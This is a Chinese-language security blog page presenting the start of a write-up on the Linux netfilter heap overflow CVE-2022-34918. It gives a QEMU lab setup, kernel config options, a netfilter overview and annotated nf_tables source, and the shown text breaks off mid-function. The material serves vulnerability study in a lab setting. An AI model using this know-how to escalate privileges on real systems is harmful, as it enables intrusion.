<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/3/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/24/%E5%A0%86%E6%BA%A2%E5%87%BA+CVE-2022-34918/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/12/24/%E5%A0%86%E6%BA%A2%E5%87%BA+CVE-2022-34918/" class="post-title-link" itemprop="url">堆溢出+CVE-2022-34918</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-12-24 16:38:51" itemprop="dateCreated datePublished" datetime="2023-12-24T16:38:51+08:00">2023-12-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-03-07 12:11:28" itemprop="dateModified" datetime="2024-03-07T12:11:28+08:00">2024-03-07</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>54k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>50 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>CVE-2022-34918</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux version <span class="number">5.17</span><span class="number">.15</span> (yhellow@yhellow-<span class="keyword">virtual</span>-machine) (gcc (Ubuntu <span class="number">9.4</span><span class="number">.0</span><span class="number">-1u</span>buntu1~<span class="number">20.04</span><span class="number">.2</span>) <span class="number">9.4</span><span class="number">.0</span>, GNU ld (GNU Binutils <span class="keyword">for</span> Ubuntu) <span class="number">2.34</span>) #<span class="number">2</span> SMP PREEMPT Tue Dec <span class="number">12</span> <span class="number">20</span>:<span class="number">07</span>:<span class="number">22</span> CST <span class="number">2023</span></span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 256M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -kernel &quot;./bzImage&quot; \</span><br><span class="line">    -append &quot;console=ttyS0 qiet loglevel=3 oops=panic panic=-1 pti=on kaslr&quot; \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd &quot;./rootfs.cpio&quot; \</span><br><span class="line">    -cpu qemu64,+smep,+smap \</span><br><span class="line">    -smp cores=1</span><br></pre></td></tr></table></figure>
<ul>
<li>smap，smep，kaslr，pti</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">chown root /root/flag</span><br><span class="line">chgrp root /root/flag</span><br><span class="line">chmod 400 /root/flag</span><br><span class="line"></span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure>
<p>内核下载： <a target="_blank" rel="noopener" href="https://cdn.kernel.org/pub/linux/kernel/v5.x/">Index of /pub/linux/kernel/v5.x/</a> </p>
<p>关键的编译选项如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_NF_TABLES=y</span><br><span class="line">CONFIG_NETFILTER_NETLINK=y</span><br><span class="line">CONFIG_BINFMT_MISC=m </span><br><span class="line">CONFIG_USER_NS=y</span><br><span class="line"></span><br><span class="line">CONFIG_E1000=m</span><br><span class="line">CONFIG_E1000E=m</span><br></pre></td></tr></table></figure>
<p><strong>Netfilter 介绍</strong></p>
<p>Netfilter 是一个 Linux 内核模块，用于防火墙功能，它提供了一个灵活的框架，允许用户自定义防火墙规则，以控制网络流量和保护网络安全</p>
<p>Netfilter 模块是 Linux 内核中流量过滤器的基础，可以与多种其他模块一起使用（例如：iptables 和 ip6tables），具有如下功能：</p>
<ul>
<li>网络地址转换（Network Address Translate）</li>
<li>数据包内容修改</li>
<li>数据包过滤的防火墙功能</li>
</ul>
<p>在分析 Netfilter 之前先解释一些防火墙的相关概念：</p>
<p>链的概念：</p>
<ul>
<li>数据报文从进入服务器到出来会经过5道关卡，分别为：<ul>
<li>Prerouting(路由前)、Input(输入)、Outpu(输出)、Forward(转发)、Postrouting(路由后) </li>
</ul>
</li>
<li>每一道关卡中有多个规则，数据报文必须按顺序一个一个匹配这些规则，这些规则串起来就像一条链，所以我们把这些关卡都叫“链”</li>
</ul>
<p><img src="/2023/12/24/%E5%A0%86%E6%BA%A2%E5%87%BA+CVE-2022-34918/1702384117476-1703407204414.png" alt="1702384117476"> </p>
<p>表的概念：</p>
<ul>
<li>每一条链上有多条规则，有些规则的作用相似，多条具有相同功能的规则合在一起就组成了一个“表” </li>
<li>Netfilter 模块拥有5个表：<ul>
<li>filter 表：用于过滤包，有 INPUT、FORWARD、OUTPUT 三个链（最常用的表）</li>
<li>nat 表：用于网络地址转换，有 PREROUTING、POSTROUTING 三个链</li>
<li>managle 表：用于给数据包做标记，几乎用不到</li>
<li>raw 表：可以实现不追踪某些数据包</li>
<li>security 表：用于强制访问控制（MAC）的网络规则（在centos6中并没有）</li>
</ul>
</li>
</ul>
<p>规则的概念：</p>
<ul>
<li>规则主要包含 “条件&amp;动作”，即匹配出符合什么条件(规则)后，对它采取怎样的动作</li>
<li>规则被添加到指定表的指定链中，由表达式和语句组成</li>
</ul>
<p>表达式的概念：</p>
<ul>
<li>表达式表示值，可以是网络地址、端口号等常量，也可以是在规则集评估期间从数据包中收集的数据</li>
<li>可以使用二进制、逻辑、关系和其他类型的表达式组合表达式以形成复杂或关系（匹配）表达式 </li>
<li>每个表达式都有一个数据类型，它决定了符号值的大小、解析和表示以及与其他表达式的类型兼容性</li>
</ul>
<p>该模块的初始化由 nfnetlink_net_init 函数执行：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __net_init <span class="title">nfnetlink_net_init</span><span class="params">(struct net *net)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nfnl_net</span> *<span class="title">nfnlnet</span> =</span> nfnl_pernet(net);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">netlink_kernel_cfg</span> <span class="title">cfg</span> =</span> &#123;</span><br><span class="line">		.groups	= NFNLGRP_MAX,</span><br><span class="line">		.input	= nfnetlink_rcv,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MODULES</span></span><br><span class="line">		.bind	= nfnetlink_bind,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	nfnlnet-&gt;nfnl = netlink_kernel_create(net, NETLINK_NETFILTER, &amp;cfg);</span><br><span class="line">	<span class="keyword">if</span> (!nfnlnet-&gt;nfnl)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果后续收到 netfilter 的消息则会调用 <code>netlink_kernel_cfg-&gt;input</code> 函数，也即 nfnetlink_rcv 函数</li>
</ul>
<p>创建 table 的函数：nf_tables_newtable</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_newtable</span><span class="params">(struct sk_buff *skb, <span class="keyword">const</span> struct nfnl_info *info,</span></span></span><br><span class="line"><span class="params"><span class="function">			      <span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> nla[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nftables_pernet</span> *<span class="title">nft_net</span> =</span> nft_pernet(info-&gt;net);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">netlink_ext_ack</span> *<span class="title">extack</span> =</span> info-&gt;extack;</span><br><span class="line">	u8 genmask = nft_genmask_next(info-&gt;net);</span><br><span class="line">	u8 family = info-&gt;nfmsg-&gt;nfgen_family;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> info-&gt;net;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_ctx</span> <span class="title">ctx</span>;</span></span><br><span class="line">	u32 flags = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	lockdep_assert_held(&amp;nft_net-&gt;commit_mutex);</span><br><span class="line">	attr = nla[NFTA_TABLE_NAME]; </span><br><span class="line">	table = nft_table_lookup(net, attr, family, genmask,</span><br><span class="line">				 NETLINK_CB(skb).portid); <span class="comment">/* 查找名称为NFTA_TABLE_NAME的table是否存在 */</span></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(table)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (PTR_ERR(table) != -ENOENT)</span><br><span class="line">			<span class="keyword">return</span> PTR_ERR(table);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (info-&gt;nlh-&gt;nlmsg_flags &amp; NLM_F_EXCL) &#123;</span><br><span class="line">			NL_SET_BAD_ATTR(extack, attr);</span><br><span class="line">			<span class="keyword">return</span> -EEXIST;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (info-&gt;nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)</span><br><span class="line">			<span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line">		nft_ctx_init(&amp;ctx, net, skb, info-&gt;nlh, family, table, <span class="literal">NULL</span>, nla);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> nf_tables_updtable(&amp;ctx); <span class="comment">/* 如果存在该table,则进行更新 */</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nla[NFTA_TABLE_FLAGS]) &#123;</span><br><span class="line">		flags = ntohl(nla_get_be32(nla[NFTA_TABLE_FLAGS]));</span><br><span class="line">		<span class="keyword">if</span> (flags &amp; ~NFT_TABLE_F_MASK)</span><br><span class="line">			<span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = -ENOMEM;</span><br><span class="line">	table = kzalloc(<span class="keyword">sizeof</span>(*table), GFP_KERNEL); <span class="comment">/* 如果不存在就创建该表,并初始化 */</span></span><br><span class="line">	<span class="keyword">if</span> (table == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">goto</span> err_kzalloc;</span><br><span class="line"></span><br><span class="line">	table-&gt;name = nla_strdup(attr, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (table-&gt;name == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">goto</span> err_strdup;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nla[NFTA_TABLE_USERDATA]) &#123;</span><br><span class="line">		table-&gt;udata = nla_memdup(nla[NFTA_TABLE_USERDATA], GFP_KERNEL);</span><br><span class="line">		<span class="keyword">if</span> (table-&gt;udata == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">goto</span> err_table_udata;</span><br><span class="line"></span><br><span class="line">		table-&gt;udlen = nla_len(nla[NFTA_TABLE_USERDATA]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = rhltable_init(&amp;table-&gt;chains_ht, &amp;nft_chain_ht_params);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> err_chain_ht;</span><br><span class="line"></span><br><span class="line">	INIT_LIST_HEAD(&amp;table-&gt;chains); <span class="comment">/* 初始化4个链表 */</span></span><br><span class="line">	INIT_LIST_HEAD(&amp;table-&gt;sets);</span><br><span class="line">	INIT_LIST_HEAD(&amp;table-&gt;objects);</span><br><span class="line">	INIT_LIST_HEAD(&amp;table-&gt;flowtables);</span><br><span class="line">	table-&gt;family = family;</span><br><span class="line">	table-&gt;flags = flags;</span><br><span class="line">	table-&gt;handle = ++table_handle;</span><br><span class="line">	<span class="keyword">if</span> (table-&gt;flags &amp; NFT_TABLE_F_OWNER)</span><br><span class="line">		table-&gt;nlpid = NETLINK_CB(skb).portid;</span><br><span class="line"></span><br><span class="line">	nft_ctx_init(&amp;ctx, net, skb, info-&gt;nlh, family, table, <span class="literal">NULL</span>, nla); <span class="comment">/* 将table加到nftbales上下文中 */</span></span><br><span class="line">	err = nft_trans_table_add(&amp;ctx, NFT_MSG_NEWTABLE);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> err_trans;</span><br><span class="line"></span><br><span class="line">	list_add_tail_rcu(&amp;table-&gt;<span class="built_in">list</span>, &amp;nft_net-&gt;tables); </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err_trans:</span><br><span class="line">	rhltable_destroy(&amp;table-&gt;chains_ht);</span><br><span class="line">err_chain_ht:</span><br><span class="line">	kfree(table-&gt;udata);</span><br><span class="line">err_table_udata:</span><br><span class="line">	kfree(table-&gt;name);</span><br><span class="line">err_strdup:</span><br><span class="line">	kfree(table);</span><br><span class="line">err_kzalloc:</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建 chain 的函数：nf_tables_newchain</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_newchain</span><span class="params">(struct sk_buff *skb, <span class="keyword">const</span> struct nfnl_info *info,</span></span></span><br><span class="line"><span class="params"><span class="function">			      <span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> nla[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nftables_pernet</span> *<span class="title">nft_net</span> =</span> nft_pernet(info-&gt;net);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">netlink_ext_ack</span> *<span class="title">extack</span> =</span> info-&gt;extack;</span><br><span class="line">	u8 genmask = nft_genmask_next(info-&gt;net);</span><br><span class="line">	u8 family = info-&gt;nfmsg-&gt;nfgen_family;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> info-&gt;net;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span>;</span></span><br><span class="line">	u8 policy = NF_ACCEPT;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nft_ctx</span> <span class="title">ctx</span>;</span></span><br><span class="line">	u64 handle = <span class="number">0</span>;</span><br><span class="line">	u32 flags = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	lockdep_assert_held(&amp;nft_net-&gt;commit_mutex);</span><br><span class="line"></span><br><span class="line">	table = nft_table_lookup(net, nla[NFTA_CHAIN_TABLE], family, genmask,</span><br><span class="line">				 NETLINK_CB(skb).portid); <span class="comment">/* 首先先找table,无table直接退出 */</span></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(table)) &#123;</span><br><span class="line">		NL_SET_BAD_ATTR(extack, nla[NFTA_CHAIN_TABLE]);</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(table);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	chain = <span class="literal">NULL</span>;</span><br><span class="line">	attr = nla[NFTA_CHAIN_NAME]; <span class="comment">/* 找chain是否存在,存在进入update,不存在则添加一个新chain */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nla[NFTA_CHAIN_HANDLE]) &#123; <span class="comment">/* 通过nla[NFTA_CHAIN_HANDLE]查找chain */</span></span><br><span class="line">		handle = be64_to_cpu(nla_get_be64(nla[NFTA_CHAIN_HANDLE]));</span><br><span class="line">		chain = nft_chain_lookup_byhandle(table, handle, genmask);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(chain)) &#123;</span><br><span class="line">			NL_SET_BAD_ATTR(extack, nla[NFTA_CHAIN_HANDLE]);</span><br><span class="line">			<span class="keyword">return</span> PTR_ERR(chain);</span><br><span class="line">		&#125;</span><br><span class="line">		attr = nla[NFTA_CHAIN_HANDLE];</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nla[NFTA_CHAIN_NAME]) &#123; <span class="comment">/* 通过nla[NFTA_CHAIN_NAME]查找chain */</span></span><br><span class="line">		chain = nft_chain_lookup(net, table, attr, genmask);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(chain)) &#123;</span><br><span class="line">			<span class="keyword">if</span> (PTR_ERR(chain) != -ENOENT) &#123;</span><br><span class="line">				NL_SET_BAD_ATTR(extack, attr);</span><br><span class="line">				<span class="keyword">return</span> PTR_ERR(chain);</span><br><span class="line">			&#125;</span><br><span class="line">			chain = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!nla[NFTA_CHAIN_ID]) &#123;</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nla[NFTA_CHAIN_POLICY]) &#123;</span><br><span class="line">		<span class="keyword">if</span> (chain != <span class="literal">NULL</span> &amp;&amp;</span><br><span class="line">		    !nft_is_base_chain(chain)) &#123;</span><br><span class="line">			NL_SET_BAD_ATTR(extack, nla[NFTA_CHAIN_POLICY]);</span><br><span class="line">			<span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (chain == <span class="literal">NULL</span> &amp;&amp;</span><br><span class="line">		    nla[NFTA_CHAIN_HOOK] == <span class="literal">NULL</span>) 